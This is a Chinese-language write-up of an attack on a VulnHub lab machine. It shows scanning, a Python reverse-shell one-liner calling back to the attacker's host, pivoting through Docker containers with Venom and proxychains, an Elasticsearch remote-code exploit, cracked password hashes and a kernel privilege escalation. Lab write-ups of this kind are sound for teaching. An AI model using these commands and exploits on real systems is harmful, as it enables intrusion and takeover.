# 第一周

靶机地址：https://www.vulnhub.com/entry/boredhackerblog-social-network,454/

kali：10.0.2.4

靶机：10.0.2.5



## 一、主机发现

通过arp-scan发现存活主机

```bash
arp-scan -l
```

![image-20220119141718715](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/image-20220119141718715.png)



## 二、端口探测及服务版本扫描

```bash
nmap -sV -Pn 10.0.2.5 -v	//-sV是详细探测服务版本
```

![端口服务扫描](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F.png)



## 三、WEB服务探测及攻击

- 通过前期的探测只发现22、5000的两个端口，5000端口对应的服务是一个python写的Werkzeug的http框架，于是通过浏览器访问5000端口，如下所示：
- 通过在输入框中输入数据，发现只能文本输出，不存在代码执行和命令执行漏洞；

![image-20220119142544828](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E7%AB%AF%E5%8F%A3%E8%AE%BF%E9%97%AE.png)



- 进行目录扫描看看能不能发现一些敏感的目录及一些备份文件；如下图所示，发现存在admin的敏感目录；

```bash
dirsearch -u "http://10.0.2.5:5000"
```

![image-20220119142625329](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F.png)



- 通过访问/admin目录，如下所示：

![image-20220119142708692](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE.png)



因为想着是用python写的一个web框架，刚好这里有输入框，就继续尝试有没有命令执行和代码执行的漏洞，遂通过nc在本地监听5555端口，通过python的反弹shell的代码来进行执行，如下所示

- nc反弹shell的代码：


```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.4",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

![image-20220119161433964](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/nc%E5%8F%8D%E5%BC%B9shell.png)



- 成功反弹shell，通过id命令，确认当前为管理员权限。兴奋😎！

![image-20220119161552443](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/root%E6%9D%83%E9%99%90.png)



## 四、判断容器

- 但是通过查看IP，发现服务器IP为172.17.0.0/16网段的

![image-20220119162440160](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/ip%E5%9C%B0%E5%9D%80.png)



- 通过查看本地文件，发现本地文件中包含Dockerfile，初步怀疑该服务器为Docker容器，通过对Dockerfile文件进行详细查看，详情如下所示：

![image-20220119162542505](.\images\当前目录文件查看.png)



- /proc/1/目录下，是服务器在启动的时候需要加载的进程，通过对/proc/1/目录的查看，发现很多docker的关键字，基本上可以判断，目前拿到的权限为docker服务器的权限；

![image-20220119162739921](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E7%A1%AE%E5%AE%9A%E4%B8%BAdocker%E9%83%A8%E7%BD%B2%E7%9A%84%E7%B3%BB%E7%BB%9F.png)



- 判断是否为docker的另外一种办法就是，就是查看根目录下是否有/.dockerenv，如下所示，目前拿到的权限说就是dockers容器的权限

![image-20220119163150704](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E5%8F%A6%E5%A4%96%E4%B8%80%E7%A7%8D%E5%88%A4%E6%96%ADdocker%E7%B3%BB%E7%BB%9F%E6%96%B9%E6%B3%95.png)



## 五、内网渗透

- 既然是在容器内部，那就看看有没有其他存活的容器，通过编写简单的小脚本进行网段探测，脚本内容如下所示；

```bash
for i in $(seq 1 10);do ping -c 1 172.17.0.$i; done
//生成1-10的顺序数，然后循环对172.17.0的网段进行ping
```

- 其中发现172.17.0.1、172.17.0.2、172.17.0.3是存活的，其中172.17.0.2是已被拿下的入口容器，如下所示；

![存活主机探测](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B.png)

发现了存活的主机，就按照常规继续进行渗透，如进行端口扫描啊之类的。但是在此之前，需要先把172.17网段的内网流量给代理出来，所以就需要进行内网穿透。



### 5.1 内网穿透

内网穿透

内网穿透工具：Venom

项目地址：https://github.com/Dliv3/Venom

在下载和使用本项目的时候，可以下载编译好的工具👀

- 先在本地启动监听

```bash
./admin_linux_x64 -lport 6666
```

![image-20220119171202659](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%90%AF%E5%8A%A8%E7%9B%91%E5%90%AC.png)



- 然后需要将agent上传到客户端，于是可以在当前文件目录利用python临时搭建http服务

- ```bash
	python3 -m http.server 80
	```

![image-20220119171328654](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E5%90%AF%E5%8A%A8http%E6%9C%8D%E5%8A%A1.png)



- 通过wget命令下载agent，并赋执行权限，如下图所示：


![image-20220119171428231](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E4%B8%8A%E4%BC%A0%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%A3%E7%90%86%E5%B9%B6%E8%B5%8B%E5%80%BC.png)



- 通过agent进行反向连接服务端


![image-20220119171552081](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1%E7%AB%AF.png)



- 查看服务端状态信息，发现已有客户端上线，连接成功并跳转到节点1


![image-20220119171746227](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png)



- 开启socks5代理并在本地监听1080端口，通过该端口转发流量

![image-20220119172021429](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E5%90%AF%E5%8A%A8socks%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3.png)



- 修改proxychains配置文件，开启流量转发，如下所示

```bash
vi /etc/proxychains4.conf
```

![image-20220120151101535](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/proxychains%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png)



- 针对发现的存活主机进行端口扫描，详情如下所示：

```bash
proxychains nmap -sT -Pn -sV 172.17.0.1 -v
```

![image-20220119211412453](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/172.17.0.1%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B.png)

```bash
proxychains nmap -sT -Pn -sV 172.17.0.3 -v
```

![image-20220119211537295](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/172.17.0.2%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B.png)

```bash
proxychains nmap -sT -Pn -sV 172.17.0.3 -v
```

![image-20220119211956105](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/172.17.0.3%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E5%8F%91%E7%8E%B0.png)



- 其中发现172.17.0.3存在Elasticsearch服务，首先想到该服务会不会存在未授权访问，于是通过searchsploit进行exp检索，来尝试进行未授权漏洞利用，如下图所示：

![image-20220119213030651](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/Elasticsearch%E7%9A%84exp.png)



- 拷贝文件到本地；`注：需要了解该文件的具体目录`

```bash
cp /usr/share/exploitdb/exploits/linux/remote/36337.py .
```



==注：在使用exp之前，最好记得查看代码，看看里面的说明，养成良好的习惯==

针对elasticsearch进行未授权攻击，如下图所示：

```bash
proxychains python2 36337.py 172.17.0.3
```

![image-20220119213232722](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/Ela%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.png)



- 通过对elastcsearch的攻击，直接获取172.17.0.3的权限，通过id、whoami的命令查看也是root权限，但是该权限还是容器的权限

![image-20220119213517291](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E6%9D%83%E9%99%90%E6%9F%A5%E7%9C%8B.png)



- 通过对本地的文件进行查看，看看能不能发现什么，发现存在passwords的文件😂

![image-20220119215725792](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E6%9F%A5%E7%9C%8B%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6.png)



- 通过对passwords的查看，发现里面存在账号和密码的hash值，如下所示

![image-20220119215813163](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E8%AF%A6%E6%83%85.png)



- 针对密码的hash值进行解密，如下所示


```text
john:3f8184a7343664553fcb5337a3138814	=> john/1337hack
test:861f194e9d6118f3d942a72be3e51749	=> test/1234test
admin:670c3bbc209a18dde5446e5e6c1f1d5b	=> admin/1111pass
root:b3d34352fc26117979deabdf1b9b6354	=> root/1234pass
jane:5c158b60ed97c723b673529b8a3cf72b	=> jane/1234jane
```



- 因为刚好发现172.17.0.1存在ssh服务，所以就尝试利用发现的账号密码进行登录，通过对每个账号的尝试，发现只有john的账号能够登录成功，如下所示：
- 在登陆的过程中，有提示信息，发现172.17.0.1有两个网卡，一个是eth0，一个是docker0，基本上能够判断172.17.0.1就是宿主机10.0.2.5，如下图所示

![image-20220119221608928](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/ssh%E7%AB%AF%E5%8F%A3%E7%99%BB%E5%BD%95.png)



## 六、提权

- 通过使用id的命令，发现当前的账号并非是root的权限，如下所示

![image-20220119220915590](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E6%9D%83%E9%99%90%E5%88%A4%E6%96%AD.png)



- 通过观察刚才登录的ssh，发现banner信息，其中显示ubuntu的内核为3.13.0，这是一个比较老的内核，所以就尝试能不能通过searchsploit查找与该版本内核相关的exp，如下所示：

```bash
searchsploit Linux 3.13.0
```

![image-20220119221856470](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9Eexp%E6%9F%A5%E6%89%BE.png)



- 通过对EXP的查看，其中发现lib这里在执行的时候，会在目标操作系统调用gcc，但是通过实际操作发现，目标系统并未安装gcc，于是只能尝试去修改攻击源代码
- 删除第139-147行，

![image-20220120164657266](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/image-20220120164657266.png)



- 然后编译37292.c文件，编译后 的文件名称为exp

```bash
gcc -o exp 37292.c
```

![image-20220119223330617](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E5%AF%B9exp%E6%BA%90%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E7%BC%96%E8%AF%91.png)



- 通过阅读源代码得知，其中该exp在运行的时候，会在目标系统的/tmp目录下调用ofs-lib.so的二进制文件，于是看看能不能在kali中查找到存在的ofs-lib,so文件，如下所示：

```bash
find / -name ofs-lib.so
=>
/usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so

//还有一种命令
//locate ofs-lib.so
```

![image-20220119224124252](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E5%AF%BB%E6%89%BE%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6.png)



- 还是通过搭建临时的http服务，将exp和ofs-lib.so文件上传到目标服务器的/tmp目录下面，如下图所示：

![image-20220119224607140](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E6%8F%90%E6%9D%83%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD.png)



- 为exp文件添加执行的权限，并执行exp，如下所示，文件执行正常，成功的将权限提升到管理员权限；

![image-20220119224742207](https://raw.githubusercontent.com/NUK96/VulnHub_TargetDrone_Pratice/main/images/%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9F.png)



至此，本次的靶机攻击完成！



攻击思路：

1. 首先通过二层协议去探测存活的主机
2. 针对发现的存活主机，进行端口、服务、版本扫描
3. 针对发现的http服务，进行目录扫描，发现敏感目录，去尝试代码执行和命令执行漏洞
4. 获取目标服务器的root权限，但是通过本地文件查看，确定为docker容器，于是接下来进行内网渗透
5. 首先探测存活的其他主机，然后想办法利用kali自身的工具对存活的主机进行端口、服务、版本的探测
6. 利用Venom进行内网穿透，将流量代理出来
7. 再通过代理对存活的主机进行扫描，其中发现ElasticSearch服务，尝试进行代码执行漏洞
8. 获取到权限之后，即使是root权限，但也是docker的权限，于是开始信息收集，发现本地存在passwords的敏感文件
9. 通过对敏感文件的查阅，解密各个账号和密码的hash值
10. 因为之前发现docker的服务器有开放22端口，于是利用解密的账号密码进行挨个登录尝试，test账号登录成功
11. 成功登录，由于权限太低，通过ssh登录时的提示信息，发现目标操作系统是3.13.0的比较老的内核系统，尝试利用内核漏洞进行提权
12. 通篇阅读exp发现，在执行的时候会调用gcc，但是目标系统没有gcc，于是尝试修改源代码
13. 上传exp和必要的二进制文件，执行，提权成功！

